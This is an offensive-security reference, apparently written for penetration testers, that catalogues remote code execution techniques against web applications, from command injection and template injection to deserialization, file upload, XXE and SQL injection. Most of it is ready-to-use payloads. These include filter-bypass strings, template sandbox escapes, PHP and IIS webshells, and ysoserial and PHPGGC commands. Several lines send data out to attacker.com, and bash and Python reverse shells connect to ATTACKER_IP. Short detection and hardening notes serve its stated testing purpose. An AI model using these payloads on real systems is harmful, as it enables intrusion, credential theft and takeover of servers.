# RCE All Types — Comprehensive Remote Code Execution Taxonomy

> Authorized penetration testing and CTF only. Confirm written scope. Every technique here carries a detection signal and hardening fix.

---

## Overview

Remote Code Execution (RCE) is the crown jewel of web exploitation — it means arbitrary OS commands execute on the target server. This skill covers every major RCE class: the payload, detection method, tooling, real CVE examples, and the defensive fix for each.

---

## 1. OS Command Injection — PHP Sinks

### 1.1 Vulnerable PHP Functions

| Function | Behavior |
|---|---|
| `system($input)` | Executes and prints output |
| `exec($input, $out)` | Executes, output to array |
| `passthru($input)` | Executes, raw binary output |
| `shell_exec($input)` | Executes, returns string |
| `` `$input` `` | Backtick operator — same as shell_exec |
| `popen($input, "r")` | Opens process as file handle |
| `proc_open($input, ...)` | Full process control |

### 1.2 Basic Payloads

```bash
# Detect via time delay (blind)
input=;sleep+10
input=|sleep 10
input=`sleep 10`
input=$(sleep 10)

# Out-of-band detection (Burp Collaborator / interactsh)
input=;curl+http://COLLABORATOR.oastify.com/$(whoami)
input=;nslookup+$(whoami).COLLABORATOR.oastify.com

# Direct output (non-blind)
input=;id
input=|cat /etc/passwd
input=;ls -la /var/www/html/

# Chaining — bypass semicolon filters
input=$(id)
input=`id`
input=&&id
input=||id
input=%0aid           # URL-encoded newline
input=%0d%0aid        # CRLF + command
```

### 1.3 Filter Bypass

```bash
# Space filters
${IFS}id
$IFS$9id
{id}

# Slash filters
cat${IFS}/etc/passwd
cat$IFS/etc$IFS/passwd
$(echo 'aWQ=' | base64 -d)   # base64-decode 'id'

# Quote bypass
i''d
i"d"

# Wildcard bypass
/bin/i?   # matches /bin/id
/b??/id

# Case insensitive (Windows)
CMD /c WhOaMi
```

### 1.4 Detection Signals

- Unexpected outbound DNS/HTTP from web server process
- Process creation: `sh -c`, `bash -c`, `cmd.exe /c` spawned by web server
- WAF: block `;`, `|`, `&`, `$(`, backtick in parameters

### 1.5 Hardening

```php
// WRONG — never do this
$output = shell_exec("ping -c 1 " . $_GET['host']);

// RIGHT — use escapeshellarg for single arguments
$host = escapeshellarg($_GET['host']);
$output = shell_exec("ping -c 1 $host");

// BEST — whitelist and avoid shell entirely
if (!filter_var($_GET['host'], FILTER_VALIDATE_IP)) die("Invalid");
$output = shell_exec("ping -c 1 " . escapeshellarg($_GET['host']));
```

### 1.6 Real CVEs

- **CVE-2021-41773** — Apache 2.4.49 path traversal → RCE via mod_cgi
- **CVE-2022-22963** — Spring Cloud Function SpEL injection → OS command execution
- **CVE-2021-44228** — Log4Shell: JNDI injection → RCE (not direct command injection but same effect)

---

## 2. Server-Side Template Injection (SSTI) → RCE

SSTI occurs when user input is embedded directly in a template and evaluated. Each engine has its own payload syntax.

### 2.1 Detection — Engine Fingerprinting

```
Input: {{7*7}}    → 49       → Jinja2 / Twig
Input: ${7*7}     → 49       → Freemarker / Pebble
Input: #{7*7}     → 49       → Pebble / Thymeleaf
Input: *{7*7}     → 49       → Spring (Thymeleaf)
Input: {{7*'7'}}  → 7777777  → Jinja2
Input: {{7*'7'}}  → 49       → Twig
```

Polyglot detection chain (send this single payload, observe the reflection):
```
${{<%[%'"}}%\.
```

### 2.2 Jinja2 (Python Flask/Django) RCE

```python
# Config dump — confirm SSTI
{{config}}

# MRO-based RCE (classic)
{{''.__class__.__mro__[1].__subclasses__()}}

# Find index of subprocess.Popen — enumerate and match
# Then (index varies by Python version — typically 250-350 range):
{{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()[0]}}

# Cleaner — find Popen by name
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{c('id',shell=True,stdout=-1).communicate()[0]}}
  {% endif %}
{% endfor %}

# Filter bypass — when dots/brackets/underscores are filtered
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### 2.3 Twig (PHP Symfony/Laravel) RCE

```php
// Detect
{{7*7}}   → 49

// RCE via _self.env
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// RCE via filter chain
{{["id"]|map("system")|join}}

// RCE via filter + passthru
{{"id"|passthru}}

// Dump environment
{{dump(_context)}}
```

### 2.4 Smarty (PHP) RCE

```php
// Execute system command
{system('id')}

// Alternate tag syntax
{php}echo system('id');{/php}

// Smarty3 — {literal} bypass
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### 2.5 Freemarker (Java) RCE

```java
// Classic — uses freemarker.template.utility.Execute
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// With ObjectWrapper
${"freemarker.template.utility.Execute"?new()("id")}

// Via class.getResource
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign dwf=owc.newInstance()>
<#assign ec=dwf("freemarker.template.utility.Execute",object?api)>
${ec("id")}
```

### 2.6 Pebble (Java) RCE

```java
// Via getClass()
{{ variable.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(variable.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id') }}
```

### 2.7 Tools

- **tplmap**: https://github.com/epinna/tplmap — auto-detects and exploits SSTI across all engines
  ```bash
  python tplmap.py -u "http://target.com/search?q=*" --os-shell
  python tplmap.py -u "http://target.com/search?q=*" --os-cmd "id"
  ```
- **SSTImap**: updated fork: https://github.com/vladko312/SSTImap

### 2.8 Real CVEs

- **CVE-2022-22947** — Spring Cloud Gateway SpEL SSTI → RCE (CVSS 10.0)
- **CVE-2019-8341** — Jinja2 sandbox escape
- **CVE-2023-22527** — Atlassian Confluence OGNL injection → SSTI → RCE

---

## 3. Deserialization RCE

### 3.1 PHP Unserialize

```php
// Vulnerable code
$data = unserialize($_COOKIE['user']);

// Gadget class exploit — magic methods fire on unserialize
class Exploit {
    public $cmd;
    public function __wakeup() {
        system($this->cmd);
    }
}

// Generate payload
$e = new Exploit();
$e->cmd = "id";
echo urlencode(serialize($e));
// → O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}

// PHPGGC — pre-built gadget chains for popular frameworks
# https://github.com/ambionics/phpggc
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 exec 'id'
phpggc Magento/RCE1 exec 'curl http://attacker.com/$(whoami)'
```

### 3.2 Java ObjectInputStream

```bash
# ysoserial — pre-built Java gadget chains
# https://github.com/frohoff/ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64

# Common gadget chains by library:
# CommonsCollections1-7: Apache Commons Collections
# Spring1/2: Spring framework
# Groovy1: Groovy runtime
# JBoss: JBoss application server

# Send via Burp: replace serialized object in request body/cookie
# Java serialized objects start with: AC ED 00 05 (hex) or rO0AB (base64)
```

### 3.3 .NET BinaryFormatter / XML Deserialization

```csharp
// Detect: .NET serialized XML often starts with:
// <?xml version="1.0"?>
// <root type="System.Windows.Data.ObjectDataProvider

// ysoserial.net — .NET gadget chains
# https://github.com/pwntester/ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami > c:\inetpub\wwwroot\out.txt"
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c calc"
ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "cmd /c whoami"
```

### 3.4 Detection Signals

- Java: `AC ED 00 05` bytes at start of request body or cookie
- PHP: `O:`, `a:`, `s:` patterns in cookies/parameters
- .NET: `AAEAAAD` in Base64 encoded cookies, `System.Runtime.Remoting` in XML

### 3.5 Real CVEs

- **CVE-2017-9805** — Apache Struts 2 XStream deserialization → RCE
- **CVE-2020-2555** — Oracle WebLogic T3 deserialization → RCE (CVSS 9.8)
- **CVE-2021-21985** — VMware vCenter deserialization → RCE

---

## 4. File Upload → RCE

### 4.1 PHP Webshell via File Upload

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['c']); ?>
<?php echo shell_exec($_POST['x']); ?>

# More evasive — eval-based
<?php @eval(base64_decode($_POST['x'])); ?>

# Meterpreter web delivery
# msfvenom -p php/meterpreter/reverse_tcp LHOST=... LPORT=4444 -f raw -o shell.php
```

### 4.2 Extension Bypass Techniques

```
Direct upload: shell.php → blocked
Double extension: shell.php.jpg → may execute as PHP if misconfigured
Null byte: shell.php%00.jpg → older PHP versions strip null, leave .php
Capital: shell.PHP, shell.Php, shell.pHp
Less-known: shell.php5, shell.php7, shell.phtml, shell.phar, shell.shtml
```

### 4.3 .htaccess Upload → PHP Execution

```apache
# Upload .htaccess with this content, then upload shell.jpg:
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
```

```
# Upload order:
# 1. Upload .htaccess (if upload dir is under Apache docroot with AllowOverride)
# 2. Upload shell.jpg (contains <?php system($_GET['c']); ?>)
# 3. Access: GET /uploads/shell.jpg?c=id
```

### 4.4 IIS Web.config Upload

```xml
<!-- Upload web.config to an upload directory on IIS -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*"
              modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objShell.exec(theCommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
End Function
%>
```

### 4.5 MIME Type Spoofing

```bash
# Server checks Content-Type header, not extension or magic bytes
# Send: Content-Type: image/jpeg  (even though file is .php)
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload

# Magic byte bypass — prepend GIF header before PHP code
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php
```

### 4.6 Detection Signals

- Webshell: web server spawns unexpected child processes (sh, cmd.exe)
- .htaccess: file creation of `.htaccess` in upload directories
- Monitor: YARA rule for `<?php` + `system|exec|passthru|shell_exec` in upload dirs

### 4.7 Real CVEs

- **CVE-2021-21234** — Spring Boot Actuator logfile LFI → RCE
- **CVE-2023-3460** — Ultimate Member WordPress plugin upload bypass → RCE

---

## 5. XXE → RCE Chain

XXE alone reads files; chained with other weaknesses it reaches RCE.

### 5.1 Classic File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### 5.2 XXE → SSRF → Metadata → Credentials → RCE

```xml
<!-- Step 1: Read AWS metadata credentials via XXE+SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name">
]>
<root>&xxe;</root>

<!-- Step 2: Use leaked credentials to access S3 / SSM / EC2 run-command -->
# aws ssm send-command --instance-ids i-xxx --document-name "AWS-RunShellScript" --parameters '{"commands":["id"]}'
```

### 5.3 XXE → PHP Expect Stream → RCE

```xml
<!-- Requires PHP with expect:// wrapper enabled (rare but possible) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY cmd SYSTEM "expect://id">
]>
<root>&cmd;</root>
```

### 5.4 XXE → Read Source Code → Find Credentials → Admin Panel → RCE

```
1. XXE → file:///var/www/html/config.php  → DB password
2. XXE → file:///var/www/html/.env         → APP_KEY, ADMIN_PASS
3. Login to admin panel with leaked creds
4. Admin panel → file upload / template edit → RCE
```

### 5.5 Detection & Defense

- Parser config: disable external entities in all XML parsers
  ```java
  // Java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  ```
  ```php
  // PHP
  libxml_disable_entity_loader(true);
  ```
- WAF: block `<!DOCTYPE`, `<!ENTITY`, `SYSTEM` in XML bodies

---

## 6. SQL Injection → RCE

### 6.1 MySQL — INTO OUTFILE Webshell

```sql
-- Requirements: FILE privilege, writable webroot, no secure_file_priv restriction
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- With SQLmap
sqlmap -u "http://target.com/?id=1" --os-shell
sqlmap -u "http://target.com/?id=1" --file-write shell.php --file-dest /var/www/html/shell.php
```

### 6.2 MSSQL — xp_cmdshell

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc BASE64PAYLOAD';

-- Via SQLi in a URL parameter
'; EXEC xp_cmdshell('whoami'); --
'; EXEC xp_cmdshell('curl http://attacker.com/$(whoami)'); --
```

### 6.3 PostgreSQL — COPY TO PROGRAM

```sql
-- Requires superuser (postgres user)
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(id)';

-- Write webshell
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';

-- Via SQLi
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'; --
```

### 6.4 SQLite — load_extension

```sql
-- Load a compiled shared library as SQLite extension
SELECT load_extension('/tmp/evil.so');

-- Build evil.so (compile on attacker machine):
-- gcc -shared -fPIC evil.c -o evil.so
-- evil.c: void sqlite3_evil_init() { system("id > /tmp/out"); }
```

### 6.5 Real CVEs

- **CVE-2022-21660** — Gin-vue-admin SQLi → xp_cmdshell
- **CVE-2024-23897** — Jenkins CLI file read → RCE chain

---

## 7. Quick Reference — Payload → RCE Matrix

| Class | Trigger | Key Tool | Difficulty |
|---|---|---|---|
| Command Injection | Unsanitized shell call | commix, manual | Low |
| SSTI | Template rendering user input | tplmap, SSTImap | Medium |
| PHP Deserialization | `unserialize()` on user data | PHPGGC | Medium |
| Java Deserialization | ObjectInputStream on user data | ysoserial | High |
| File Upload | Unrestricted upload to webroot | manual | Low–Medium |
| XXE→RCE | XML parser + chained weakness | Burp, manual | High |
| SQL→RCE | SQLi + FILE/xp_cmdshell privilege | sqlmap | Medium |

---

## 8. Post-Exploitation After RCE

```bash
# Stable reverse shell (from webshell / command injection)
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# URL-encode for GET parameter:
bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Upgrade to full TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## References

- HackTricks RCE: https://book.hacktricks.xyz/pentesting-web/command-injection
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- tplmap: https://github.com/epinna/tplmap
- PHPGGC: https://github.com/ambionics/phpggc
- ysoserial: https://github.com/frohoff/ysoserial
- ysoserial.net: https://github.com/pwntester/ysoserial.net
